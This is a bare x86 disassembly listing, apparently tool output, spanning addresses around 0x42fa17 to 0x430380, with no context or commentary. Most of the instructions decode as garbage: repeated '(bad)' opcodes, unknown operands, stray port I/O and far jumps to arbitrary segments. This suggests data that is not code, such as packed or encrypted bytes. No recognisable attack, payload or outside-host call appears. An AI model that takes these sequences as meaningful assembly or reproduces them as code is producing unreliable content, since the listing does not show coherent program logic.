  42fa17:	cmp    eax,0xc8434eae
  42fa1c:	bound  ebx,QWORD PTR [edx+0x61dc68eb]
  42fa22:	cli    
  42fa23:	iret   
  42fa24:	(bad)  
  42fa25:	in     al,0x6b
  42fa27:	pop    ecx
  42fa28:	sbb    ebp,esi
  42fa2a:	stos   BYTE PTR es:[edi],al
  42fa2b:	stos   BYTE PTR es:[edi],al
  42fa2c:	fnstcw WORD PTR [edx-0x1b]
  42fa2f:	dec    esi
  42fa30:	jge    0x42faa6
  42fa32:	mov    al,BYTE PTR [eax-0x51]
  42fa35:	inc    ebx
  42fa36:	mov    DWORD PTR [ecx],esp
  42fa38:	fdivr  QWORD PTR [esi-0x16]
  42fa3b:	fnstenv [edi+0x4d]
  42fa3e:	push   es
  42fa3f:	jmp    0x422b:0x4f9162e8
  42fa46:	out    dx,eax
  42fa47:	mov    esp,0xf9275d6c
  42fa4c:	or     al,0xca
  42fa4e:	mov    esp,0xdb0192e0
  42fa53:	mov    BYTE PTR [eax+eiz*1],dh
  42fa56:	sahf   
  42fa57:	inc    esi
  42fa58:	test   al,0x5a
  42fa5a:	ja     0x42fa83
  42fa5c:	out    0x16,eax
  42fa5e:	adc    eax,DWORD PTR [edx]
  42fa60:	and    bh,BYTE PTR [ebx+0x134314de]
  42fa66:	mov    esi,0x3ca1c673
  42fa6b:	loop   0x42fa79
  42fa6d:	out    dx,al
  42fa6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa6f:	jbe    0x42fa11
  42fa71:	(bad)  [edx+ebx*8-0x2f4cc433]
  42fa78:	jge    0x42fa05
  42fa7a:	outs   dx,BYTE PTR ds:[esi]
  42fa7b:	pop    ecx
  42fa7c:	mov    ?,ebx
  42fa7e:	add    eax,0x1d92334f
  42fa83:	or     DWORD PTR es:[edi],ebx
  42fa86:	in     al,0x58
  42fa88:	inc    esp
  42fa89:	push   ecx
  42fa8a:	mov    bl,0x85
  42fa8d:	add    DWORD PTR [esi-0x14],eax
	...
  42faf4:	sbb    ebp,edi
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	int    0x75
  42fb02:	neg    DWORD PTR [ebx]
  42fb04:	jl     0x42fb04
  42fb06:	add    DWORD PTR [eax],eax
  42fb08:	add    al,0x1
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	pop    esi
  42fb0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb0e:	mov    dl,0x69
  42fb10:	sub    dl,BYTE PTR [edi]
  42fb12:	call   0xba96:0x305fd70f
  42fb19:	ror    ecx,1
  42fb1b:	ins    DWORD PTR es:[edi],dx
  42fb1c:	cmp    DWORD PTR [eax-0x4d9c6bbf],ebx
  42fb22:	push   ecx
  42fb23:	push   cs
  42fb24:	xlat   BYTE PTR ds:[ebx]
  42fb25:	ret    
  42fb26:	xchg   esp,eax
  42fb27:	fimul  DWORD PTR [eax+eiz*8-0x53]
  42fb2b:	ja     0x42fad4
  42fb2d:	or     al,0x66
  42fb2f:	cmp    esi,DWORD PTR gs:[eax+0x634086a]
  42fb36:	fwait
  42fb37:	int    0xe4
  42fb39:	xor    bl,BYTE PTR [esp+ecx*2+0x5e]
  42fb3d:	test   eax,0x352efd94
  42fb42:	sub    eax,0xdcf9d697
  42fb47:	pop    ebx
  42fb48:	in     eax,dx
  42fb49:	cmp    cl,ah
  42fb4b:	pop    ss
  42fb4c:	mov    ss,WORD PTR [esp+edx*1-0x70]
  42fb50:	cmp    edx,0x60
  42fb53:	pushf  
  42fb54:	jl     0x42fb02
  42fb56:	fiadd  WORD PTR [ecx]
  42fb58:	test   DWORD PTR [eax],ebx
  42fb5a:	sbb    DWORD PTR [edi],esp
  42fb5c:	rol    BYTE PTR [ebp+0x12],cl
  42fb5f:	mov    dl,0xa5
  42fb61:	(bad)  
  42fb62:	push   esp
  42fb63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb64:	ins    BYTE PTR es:[edi],dx
  42fb65:	push   cs
  42fb66:	inc    esi
  42fb67:	mov    ds:0x93c4cf96,eax
  42fb6c:	mov    ah,0x93
  42fb6e:	mov    al,0xad
  42fb70:	jno    0x42fb4f
  42fb72:	in     eax,dx
  42fb73:	jns    0x42fb3a
  42fb75:	jmp    FWORD PTR [ecx-0x60]
  42fb78:	push   esp
  42fb79:	sub    al,0x8b
  42fb7b:	inc    ebx
  42fb7c:	sar    DWORD PTR [edx+0x4545a8e4],cl
  42fb82:	ficomp DWORD PTR [edx-0x5a2d2390]
  42fb88:	shr    DWORD PTR [edi],cl
  42fb8a:	sbb    BYTE PTR [edi],ch
  42fb8c:	xor    ebp,DWORD PTR [edi+0x318d0589]
  42fb92:	aad    0x29
  42fb94:	and    DWORD PTR [ebx],eax
  42fb96:	(bad)  
  42fb97:	(bad)  
  42fb98:	out    dx,eax
  42fb99:	nop
  42fb9a:	movaps xmm4,XMMWORD PTR [edi]
  42fb9d:	sbb    DWORD PTR [esi+0x2e],eax
  42fba0:	xlat   BYTE PTR ds:[ebx]
  42fba1:	sar    DWORD PTR [ebx],1
  42fba3:	bound  esi,QWORD PTR [ebx+0x21]
  42fba6:	nop
  42fba7:	mov    ?,WORD PTR [esp-0x38]
  42fbab:	jb     0x42fb9c
  42fbad:	ins    BYTE PTR es:[edi],dx
  42fbae:	lods   eax,DWORD PTR ds:[esi]
  42fbaf:	jno    0x42fb39
  42fbb1:	pop    edx
  42fbb2:	inc    ebp
  42fbb3:	jne    0x42fb9d
  42fbb5:	adc    eax,0xca917347
  42fbba:	inc    ebp
  42fbbb:	cwde   
  42fbbc:	out    dx,eax
  42fbbd:	dec    ebp
  42fbbe:	xchg   esi,eax
  42fbbf:	xchg   edi,eax
  42fbc0:	mov    bl,0xbb
  42fbc2:	ss adc eax,0xb603abbf
  42fbc8:	xchg   ebp,eax
  42fbc9:	xor    al,0x41
  42fbcb:	jae    0x42fb50
  42fbcd:	call   0x148b:0x4cb73d91
  42fbd4:	mov    WORD PTR [eax],es
  42fbd6:	or     si,WORD PTR fs:[esi]
  42fbda:	fsubrp st(4),st
  42fbdc:	jg     0x42fb9a
  42fbde:	ins    BYTE PTR es:[edi],dx
  42fbdf:	hlt    
  42fbe0:	adc    al,0xaf
  42fbe2:	repnz push edx
  42fbe4:	mov    edx,0xbc49dfc5
  42fbe9:	add    ch,cl
  42fbeb:	adc    eax,0x7b70e616
  42fbf0:	push   ebp
  42fbf1:	sbb    BYTE PTR [edx],0x89
  42fbf4:	stos   DWORD PTR es:[edi],eax
  42fbf5:	cmp    edx,DWORD PTR [esi]
  42fbf7:	test   esp,esi
  42fbf9:	(bad)  
  42fbfa:	ss dec ebx
  42fbfc:	ss push esp
  42fbfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbff:	loop   0x42fbd5
  42fc01:	mov    ch,0x30
  42fc03:	pop    eax
  42fc04:	inc    edi
  42fc05:	into   
  42fc06:	mov    esp,DWORD PTR [edx-0x6d]
  42fc09:	mov    ds:0x19ae7ad7,al
  42fc0e:	out    dx,al
  42fc0f:	dec    esp
	...
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    cl,dl
  42fc81:	jnp    0x42fcae
  42fc83:	addr16 cmp bh,0x1
  42fc87:	add    BYTE PTR [ecx+eax*1],al
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	out    0x1a,eax
  42fc8e:	pop    esi
  42fc8f:	fnstenv [esi-0x4d]
  42fc92:	addr16 jmp 0x42fccc
  42fc95:	jns    0x42fc68
  42fc97:	fcomp  QWORD PTR [ecx]
  42fc99:	inc    edx
  42fc9a:	xchg   ecx,eax
  42fc9b:	mov    eax,0xca932104
  42fca0:	inc    ebx
  42fca1:	cmp    BYTE PTR [ebp+0x53],0x8
  42fca5:	dec    edx
  42fca6:	mov    al,0x31
  42fca8:	adc    DWORD PTR [esi],ebp
  42fcaa:	lods   eax,DWORD PTR ds:[esi]
  42fcab:	dec    edi
  42fcac:	stos   BYTE PTR es:[edi],al
  42fcad:	add    esp,edx
  42fcaf:	mov    esi,0x1ed3a118
  42fcb4:	scas   al,BYTE PTR es:[edi]
  42fcb5:	clc    
  42fcb6:	add    DWORD PTR [ebp+0x79dd0504],ebp
  42fcbc:	and    al,0xf7
  42fcbe:	xor    bh,BYTE PTR [ebx]
  42fcc0:	sbb    al,0x6c
  42fcc2:	cmc    
  42fcc3:	mov    WORD PTR [ecx+esi*4-0x5b357a8b],?
  42fcca:	test   BYTE PTR [edx-0x5705a071],0xf1
  42fcd1:	adc    DWORD PTR [ecx],0x48
  42fcd4:	jl     0x42fca3
  42fcd6:	test   BYTE PTR [ebx-0x20],dl
  42fcd9:	push   ss
  42fcda:	xchg   ecx,eax
  42fcdb:	aaa    
  42fcdc:	xchg   edx,eax
  42fcdd:	imul   ecx,DWORD PTR [eax-0x1e98fea9],0x54
  42fce4:	sbb    eax,0x4004475b
  42fce9:	jl     0x42fc71
  42fceb:	and    dh,BYTE PTR [edx+0x1f043fc4]
  42fcf1:	loope  0x42fd14
  42fcf3:	retf   
  42fcf4:	test   ch,al
  42fcf6:	shl    BYTE PTR [esi],1
  42fcf8:	aad    0xd8
  42fcfa:	sar    BYTE PTR [edx],0xae
  42fcfd:	xchg   esi,eax
  42fcfe:	pop    esp
  42fcff:	pop    fs
  42fd01:	lock xchg ecx,eax
  42fd03:	aas    
  42fd04:	test   al,0xa7
  42fd06:	inc    ebp
  42fd08:	mov    esp,DWORD PTR [ebx-0x74]
  42fd0b:	mov    dl,0x25
  42fd0d:	pop    esi
  42fd0e:	pushf  
  42fd0f:	add    eax,0xbf4e3555
  42fd14:	fcom   DWORD PTR [esp+ebp*2+0x1d1e6a39]
  42fd1b:	repnz sbb al,0xc8
  42fd1e:	sbb    BYTE PTR [esi-0x59],0x42
  42fd22:	xor    al,0x21
  42fd24:	xor    dh,BYTE PTR [esi]
  42fd26:	inc    eax
  42fd27:	or     edi,esp
  42fd29:	xor    ecx,DWORD PTR [esi-0x126b5185]
  42fd2f:	xchg   BYTE PTR [edi+0x6b35a51b],ch
  42fd35:	dec    ebp
  42fd36:	loope  0x42fd6f
  42fd38:	jge    0x42fd89
  42fd3a:	gs pusha 
  42fd3c:	ret    
  42fd3d:	mov    bl,0xc6
  42fd3f:	dec    ebx
  42fd40:	stos   DWORD PTR es:[edi],eax
  42fd41:	mov    bh,0x14
  42fd43:	aad    0x8b
  42fd45:	int3   
  42fd46:	push   ds
  42fd47:	les    esp,FWORD PTR [edx+0x39]
  42fd4a:	jl     0x42fd2f
  42fd4c:	sar    DWORD PTR [eax-0x41],1
  42fd4f:	jmp    FWORD PTR [edi-0x4e]
  42fd52:	scas   eax,DWORD PTR es:[edi]
  42fd53:	mov    al,ds:0x92f6007a
  42fd58:	ret    0x5284
  42fd5b:	(bad)  
  42fd5d:	adc    DWORD PTR cs:[ebx],edx
  42fd60:	pop    ecx
  42fd61:	in     al,0x1a
  42fd63:	mov    ds:0x766a7c4f,al
  42fd68:	xlat   BYTE PTR ds:[ebx]
  42fd69:	cmp    bl,BYTE PTR [ecx]
  42fd6b:	mov    bl,0xce
  42fd6d:	sub    eax,0xeb6b8fad
  42fd72:	dec    ebx
  42fd73:	(bad)  [ecx+0x5d]
  42fd77:	lds    ebx,FWORD PTR [esp+eax*1+0xfa3034c]
  42fd7e:	mov    eax,ds:0x582e6f55
  42fd83:	imul   BYTE PTR [edx+0x491f5bc1]
  42fd89:	aad    0x44
  42fd8b:	addr16 pop edi
  42fd8d:	dec    edi
  42fd8e:	and    edx,DWORD PTR [eax+eax*1+0x0]
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	rep lods eax,DWORD PTR ds:[esi]
  42fe01:	pop    esp
  42fe02:	loopne 0x42fe6e
  42fe04:	test   BYTE PTR [eax],al
  42fe06:	add    al,BYTE PTR [eax]
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	out    0x67,eax
  42fe0e:	test   eax,0x40446d56
  42fe13:	mov    BYTE PTR [ebx-0x23],ch
  42fe16:	int    0x56
  42fe18:	cmp    BYTE PTR [ebx],0xa1
  42fe1b:	loop   0x42fe4c
  42fe1d:	test   eax,0x1aa3abeb
  42fe22:	pop    esp
  42fe23:	or     bh,cl
  42fe25:	sar    bl,0xe9
  42fe28:	jae    0x42fea9
  42fe2a:	std    
  42fe2b:	push   ebp
  42fe2c:	loopne 0x42fe47
  42fe2e:	sti    
  42fe2f:	cli    
  42fe30:	std    
  42fe31:	mov    al,ds:0x53e6f1d0
  42fe36:	aam    0x98
  42fe38:	push   DWORD PTR [esi]
  42fe3a:	(bad)  [ebx-0x10]
  42fe3d:	mov    ?,WORD PTR [ebp-0x72697fbb]
  42fe43:	xchg   esp,eax
  42fe44:	push   ecx
  42fe45:	mov    BYTE PTR [edx+0x15],al
  42fe48:	cmp    eax,0x8c2d65ac
  42fe4d:	rcl    esi,cl
  42fe4f:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42fe51:	out    0x89,eax
  42fe53:	sbb    BYTE PTR [eax-0x11],dh
  42fe56:	mov    ebp,fs
  42fe58:	fcmovnbe st,st(6)
  42fe5a:	xchg   ebx,eax
  42fe5b:	scas   eax,DWORD PTR es:[edi]
  42fe5c:	je     0x42fe74
  42fe5e:	and    BYTE PTR [ebx+edi*2+0x2c0d171a],ah
  42fe65:	or     al,0xa2
  42fe67:	scas   eax,DWORD PTR es:[edi]
  42fe68:	pop    ebp
  42fe69:	int3   
  42fe6a:	push   esp
  42fe6b:	add    eax,0x48c6d7d6
  42fe70:	(bad)  
  42fe71:	push   ecx
  42fe72:	xchg   esp,eax
  42fe73:	push   ebx
  42fe74:	mov    edx,0xbfdc5bd4
  42fe79:	(bad)  
  42fe7a:	das    
  42fe7b:	sub    al,0x45
  42fe7d:	pop    esp
  42fe7e:	mov    esi,0xadbc6027
  42fe83:	add    al,0xe8
  42fe85:	mov    edi,edi
  42fe87:	jnp    0x42fe96
  42fe89:	retf   0x2a8c
  42fe8c:	iret   
  42fe8d:	ret    0xb97
  42fe90:	sub    eax,0x8ad9f440
  42fe95:	sub    ah,ah
  42fe97:	fdiv   DWORD PTR [edx]
  42fe99:	ss pop edx
  42fe9b:	mov    esi,0x2f0b4961
  42fea0:	lods   eax,DWORD PTR ds:[esi]
  42fea1:	dec    esi
  42fea2:	xor    DWORD PTR [edi+0x46654f27],eax
  42fea8:	jg     0x42ff06
  42feaa:	pop    ds
  42feab:	imul   esp,DWORD PTR [esi],0x6b
  42feae:	outs   dx,DWORD PTR ss:[esi]
  42feb0:	ret    
  42feb1:	ror    al,0x1f
  42feb4:	js     0x42fe8d
  42feb6:	bswap  ebp
  42feb8:	mov    ebx,0x3a0bc7b7
  42febd:	rol    ecx,cl
  42febf:	std    
  42fec0:	adc    dl,BYTE PTR [edi-0x54a9d240]
  42fec6:	mov    ds:0x857b7bc6,eax
  42fecb:	lock pop ss
  42fecd:	xor    eax,0x8d82beba
  42fed2:	int    0x21
  42fed4:	mov    al,0x5b
  42fed6:	add    eax,0xa460b16c
  42fedb:	inc    esi
  42fedc:	sahf   
  42fedd:	scas   al,BYTE PTR es:[edi]
  42fede:	xor    ebp,ebp
  42fee0:	mov    esp,0x919cd5bf
  42fee5:	pop    ss
  42fee6:	push   ebx
  42fee7:	jno    0x42fe8d
  42fee9:	adc    al,0xf3
  42feeb:	das    
  42feec:	mov    dl,0x58
  42feee:	adc    cl,cl
  42fef0:	retf   
  42fef1:	imul   esi,DWORD PTR [ecx-0x55],0xffffffb3
  42fef5:	bound  ebp,QWORD PTR [edi+0x49d44e6e]
  42fefb:	xchg   esp,eax
  42fefc:	shl    DWORD PTR [esi-0x51],cl
  42feff:	add    eax,0xeb0ed6a2
  42ff04:	or     eax,0xd69190cd
  42ff09:	test   DWORD PTR ds:0x66a8da11,ebp
  42ff0f:	dec    edx
	...
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [esi+ecx*1+0x20],0x18
  42ff83:	add    BYTE PTR [eax-0x4fffdff],cl
  42ff89:	add    BYTE PTR [eax],al
  42ff8b:	add    BYTE PTR [edx-0x31ba615d],bl
  42ff91:	repnz bound ebx,QWORD PTR [edi-0x8f4a863]
  42ff98:	icebp  
  42ff99:	xor    al,0x92
  42ff9b:	cmp    eax,0xddad4ce9
  42ffa0:	leave  
  42ffa1:	inc    eax
  42ffa2:	(bad)  
  42ffa4:	rcr    BYTE PTR [edi+0x6d246088],0xc1
  42ffab:	bound  esp,QWORD PTR [ebp+0x4976d268]
  42ffb1:	jae    0x42fff1
  42ffb3:	cld    
  42ffb4:	mov    ds:0x4d8a99cb,eax
  42ffb9:	or     eax,0x5667326f
  42ffbe:	inc    edi
  42ffbf:	jb     0x42ff48
  42ffc1:	adc    ebx,esi
  42ffc3:	adc    esp,0xfffffffb
  42ffc6:	sete   BYTE PTR [edi]
  42ffc9:	jo     0x430010
  42ffcb:	ins    DWORD PTR es:[edi],dx
  42ffcc:	mov    bh,0x3f
  42ffce:	mov    DWORD PTR [eax],ebp
  42ffd0:	in     eax,dx
  42ffd1:	inc    ebx
  42ffd2:	pop    eax
  42ffd3:	into   
  42ffd4:	cld    
  42ffd5:	inc    ebx
  42ffd6:	es dec ecx
  42ffd8:	outs   dx,BYTE PTR ds:[esi]
  42ffd9:	and    eax,0xe68089a2
  42ffde:	sbb    eax,0xc52aea51
  42ffe3:	sbb    edx,esi
  42ffe5:	scas   eax,DWORD PTR es:[edi]
  42ffe6:	push   edx
  42ffe7:	stos   DWORD PTR es:[edi],eax
  42ffe8:	int3   
  42ffe9:	jae    0x43005f
  42ffeb:	xchg   edx,eax
  42ffec:	xchg   ebp,eax
  42ffed:	xchg   ecx,eax
  42ffee:	mov    bh,0x32
  42fff0:	push   ss
  42fff1:	out    0xef,eax
  42fff3:	sub    eax,0x6f780930
  42fff8:	fstp   TBYTE PTR [edx-0x32]
  42fffb:	pop    ds
  42fffc:	inc    esi
  42fffd:	rcl    DWORD PTR [edi],cl
  42ffff:	xchg   ebp,eax
  430000:	adc    BYTE PTR [edx+0x591c5015],ch
  430006:	push   esp
  430007:	add    ch,bh
  430009:	pop    ecx
  43000a:	xchg   edi,eax
  43000b:	les    ecx,FWORD PTR [esi-0x4ae911ed]
  430011:	lock std 
  430013:	mov    ebp,0xcedfe5c9
  430018:	in     al,dx
  430019:	(bad)  [eax]
  43001b:	xchg   ebp,eax
  43001c:	test   DWORD PTR [ebx+0x7e],esp
  43001f:	sbb    al,ch
  430021:	imul   edx,edi,0xb4d9918f
  430027:	mov    eax,0xb1029d87
  43002c:	xchg   DWORD PTR [eax],ebx
  43002e:	xchg   esp,eax
  43002f:	shl    BYTE PTR ds:0x24fbec17,0x67
  430036:	sbb    al,0xb
  430038:	mov    bl,0xa8
  43003a:	mov    WORD PTR [edi],ds
  43003c:	popa   
  43003d:	imul   edx,esp,0xffffffb3
  430040:	pop    esi
  430041:	sub    eax,0xe832d8f
  430046:	xor    BYTE PTR [esp+edx*2],bh
  430049:	clc    
  43004a:	push   cs
  43004b:	mov    edx,0x4afb4235
  430050:	icebp  
  430051:	mov    WORD PTR [edx],ds
  430053:	arpl   WORD PTR [esi],ax
  430055:	ja     0x4300b2
  430057:	inc    eax
  430058:	cmc    
  430059:	sbb    ah,al
  43005b:	xchg   BYTE PTR [ebx],cl
  43005d:	xor    BYTE PTR [ebx-0x17f02881],dl
  430063:	neg    DWORD PTR [ecx+ebx*4+0x36d09cc5]
  43006a:	jge    0x430064
  43006c:	jb     0x430019
  43006e:	jne    0x43005a
  430070:	pop    esp
  430071:	cmp    DWORD PTR gs:[ebx-0xa],ebx
  430075:	cmp    BYTE PTR [edx+ebx*4],ch
  430078:	sahf   
  430079:	xchg   edi,eax
  43007a:	lds    eax,FWORD PTR [edx+edx*2+0x260a05d7]
  430081:	push   edi
  430082:	in     al,dx
  430083:	add    edx,DWORD PTR [esi]
  430085:	outs   dx,BYTE PTR ds:[esi]
  430086:	aas    
	...
  4300f3:	add    BYTE PTR [ebp+0x55],cl
  4300f6:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  4300fc:	mov    esp,ebp
  4300fe:	or     ah,dh
  430100:	dec    ebp
  430101:	add    bh,al
  430103:	add    BYTE PTR [eax],cl
  430105:	add    BYTE PTR [eax],al
  430107:	mov    DWORD PTR [eax],0x40f44545
  43010d:	xor    DWORD PTR [eax],eax
  43010f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430115:	(bad)  
  430116:	enter  0x4d45,0xbc
  43011a:	mov    esi,DWORD PTR [edx]
  43011c:	hlt    
  43011d:	test   ebx,ecx
  43011f:	pushf  
  430120:	enter  0x4df8,0x8b
  430124:	mov    DWORD PTR [ebp+0x8],0x894708
  43012b:	inc    ebp
  43012c:	mov    ebp,0xff8bfffc
  430131:	dec    ebp
  430132:	mov    ch,0xf4
  430134:	call   DWORD PTR [ebx-0x1]
  430137:	mov    ebx,0x8005474
  43013c:	call   DWORD PTR [ecx+0x8]
  43013f:	pop    es
  430140:	jmp    0xb8:0xacb4533
  430147:	fwait
  430148:	mov    esi,DWORD PTR [edx-0xc]
  43014b:	xor    cl,bl
  43014d:	add    BYTE PTR [ebx+0x3c83203],bl
  430153:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  430159:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  43015f:	xor    eax,DWORD PTR [eax]
  430161:	retf   
  430162:	retf   
  430163:	add    ecx,eax
  430165:	enter  0x894d,0x64
  430169:	dec    ebp
  43016a:	sbb    ah,cl
  43016c:	add    BYTE PTR [ebx-0xb9bb277],cl
  430172:	dec    DWORD PTR [ebx-0xbcfb275]
  430178:	test   DWORD PTR [ebx],esi
  43017a:	dec    ebx
  43017c:	inc    DWORD PTR [ebx]
  43017e:	inc    eax
  43017f:	enter  0x8989,0x50
  430183:	(bad)  
  430184:	call   DWORD PTR [ebx+ecx*4-0x1]
  430188:	cld    
  430189:	dec    DWORD PTR [ebp-0xa90001]
  43018f:	push   edi
  430190:	mov    BYTE PTR [edx+0x1],ch
  430193:	and    al,BYTE PTR [eax]
  430195:	pop    ecx
  430196:	inc    ebp
  430197:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43019d:	push   0xffffff89
  43019f:	pop    ecx
  4301a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301a1:	dec    ebp
  4301a2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4301a8:	jne    0x4301f4
  4301aa:	lea    eax,[eax]
  4301ac:	push   eax
  4301ad:	(bad)  
  4301ae:	dec    DWORD PTR [eax]
  4301b0:	mov    DWORD PTR [eax],eax
  4301b2:	test   al,0x0
  4301b4:	add    BYTE PTR [ebp-0x18],cl
  4301b7:	xor    ebp,DWORD PTR [ebx]
  4301b9:	add    eax,DWORD PTR [eax]
  4301bb:	mov    eax,eax
  4301bd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301c4:	inc    ebp
  4301c5:	mov    DWORD PTR [ebx+0x459408],ecx
  4301cb:	arpl   WORD PTR [ebx-0x372749b],cx
  4301d1:	sub    al,0x80
  4301d3:	inc    DWORD PTR [ecx]
  4301d5:	lea    eax,[eax]
  4301d7:	or     al,0x0
  4301d9:	inc    DWORD PTR [ecx-0x18]
  4301dc:	mov    ecx,DWORD PTR [ebx]
  4301de:	cld    
  4301df:	add    BYTE PTR [ecx+0x75014d],cl
  4301e5:	(bad)  
  4301e6:	xchg   ebp,eax
  4301e7:	fdivr  st,st(7)
  4301e9:	inc    eax
  4301ea:	inc    DWORD PTR [eax]
  4301ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4301ef:	xor    edx,DWORD PTR [edx+0x7201b8]
  4301f5:	add    BYTE PTR [edx],dl
  4301f7:	enter  0x4d90,0x0
  4301fb:	mov    eax,DWORD PTR [eax]
  4301fd:	hlt    
  4301fe:	add    al,0xa5
  430200:	mov    al,0xff
  430202:	add    bh,bh
  430204:	add    BYTE PTR [ebx],dh
  430206:	inc    DWORD PTR [ebx]
  430208:	sbb    al,0x89
  43020a:	jne    0x4301e8
  43020c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430212:	mov    eax,DWORD PTR [ebp-0xff0048]
  430218:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43021f:	inc    DWORD PTR [ebp-0x75]
  430222:	fisttp QWORD PTR [esi+ebp*8]
  430225:	test   DWORD PTR [esi-0x1],esp
  430228:	inc    ebp
  430229:	(bad)  
  43022a:	aas    
  43022b:	inc    ebp
  43022c:	(bad)  
  43022d:	lea    edi,[esp+eiz*2-0x1]
  430231:	inc    edi
  430233:	mov    DWORD PTR ds:0x8000c7a0,edi
  430239:	mov    ebp,esp
  43023b:	cld    
  43023c:	loop   0x4301cb
  43023e:	inc    ebp
  43023f:	(bad)  
  430240:	out    dx,al
  430241:	(bad)  
  430242:	fisttp WORD PTR [eax+0x8801c7]
  430248:	jecxz  0x43028f
  43024a:	in     al,dx
  43024b:	inc    DWORD PTR [ebp-0x4]
  43024e:	out    0x8d,eax
  430250:	aas    
  430251:	inc    edi
  430253:	jmp    FWORD PTR [eax-0x78]
  430256:	inc    DWORD PTR [ecx]
  430258:	mov    DWORD PTR [eax],0xc7043d
  43025e:	ins    BYTE PTR es:[edi],dx
  43025f:	test   edi,edi
  430261:	pandn  mm0,mm5
  430264:	aas    
  430265:	add    bh,al
  430267:	mov    esi,DWORD PTR [eax-0x4]
  43026a:	inc    DWORD PTR [eax+0xdf01ee]
  430270:	(bad)  
  430271:	or     BYTE PTR [ebp+eax*2-0x1],dh
  430275:	mov    ebp,ebx
  430277:	xchg   esp,eax
  430278:	fild   DWORD PTR [eax]
  43027a:	(bad)  
  43027b:	mov    edi,DWORD PTR [eax+0x3]
  43027e:	(bad)  
  43027f:	cmp    al,0xe7
  430281:	dec    ebp
  430282:	leave  
  430283:	mov    ebp,eax
  430285:	fsubr  DWORD PTR [edx]
  430287:	add    BYTE PTR [eax],al
  430289:	lea    ecx,[ebx-0x7f0003b4]
  43028f:	push   edx
  430290:	add    DWORD PTR [ebp+0x0],edx
  430293:	mov    esi,DWORD PTR [eax]
  430295:	mov    WORD PTR [edi],ss
  430297:	add    BYTE PTR [eax],al
  430299:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43029f:	add    ah,bh
  4302a1:	push   0x7d
  4302a3:	dec    DWORD PTR [ebx+0xd88c]
  4302a9:	push   edx
  4302aa:	mov    edx,DWORD PTR [ecx-0x4]
  4302ad:	call   DWORD PTR [eax+0x7d01fc]
  4302b3:	mov    esi,DWORD PTR [esi]
  4302b5:	cld    
  4302b6:	add    BYTE PTR [eax+0x560150],dl
  4302bc:	test   DWORD PTR [ebp+0x75],eax
  4302bf:	loop   0x43024c
  4302c1:	jmp    0xe38b:0x947dc7fc
  4302c8:	fsub   st,st(7)
  4302ca:	add    bh,al
  4302cc:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  4302d2:	add    edi,edi
  4302d4:	add    bh,bh
  4302d6:	adc    al,0xed
  4302d8:	add    dh,ah
  4302da:	push   eax
  4302db:	inc    ebp
  4302dc:	push   esi
  4302dd:	fisttp WORD PTR [ebx+0x4dc7f43f]
  4302e3:	test   BYTE PTR [ebx],dh
  4302e5:	out    0x5,al
  4302e7:	shl    BYTE PTR [edx+0x45],0x0
  4302eb:	jmp    0x4302ae
  4302ed:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  4302f4:	inc    esi
  4302f5:	jle    0x4302f7
  4302f7:	test   edi,eax
  4302f9:	(bad)  
  4302fa:	call   0x13003fe
  4302ff:	out    0x75,al
  430301:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430307:	in     al,dx
  430308:	mov    esp,edx
  43030a:	mov    ah,0x85
  43030c:	add    bh,bh
  43030e:	call   0x1292d12
  430313:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43031a:	add    ebx,esp
  43031c:	add    ah,ch
  43031e:	xor    BYTE PTR [ebp-0xff0073],al
  430324:	mov    ebx,ebp
  430326:	cld    
  430327:	jle    0x4302b2
  430329:	add    DWORD PTR gs:[eax],eax
  43032c:	add    BYTE PTR [eax+0x1],dl
  43032f:	inc    ebp
  430330:	inc    ebp
  430331:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  430337:	dec    DWORD PTR [ebx-0x3fd80318]
  43033d:	add    BYTE PTR [ebp-0xbf0040],dl
  430343:	inc    ebp
  430344:	fmul   QWORD PTR [ebx-0x4faf0400]
  43034a:	inc    ebp
  43034b:	add    DWORD PTR [ebx+0x459c00],ecx
  430351:	mov    edi,edi
  430353:	mov    eax,0xe80800ff
  430358:	inc    ebp
  430359:	sub    cl,BYTE PTR [ebx-0x47000400]
  43035f:	add    al,0x1
  430361:	rol    BYTE PTR [eax],0x1e
  430364:	jne    0x4303ab
  430366:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  43036c:	inc    DWORD PTR [ecx]
  43036e:	call   0x882c73
  430373:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  430379:	call   0x432d7f
  43037e:	xor    bh,bh
  430380:	push   edi
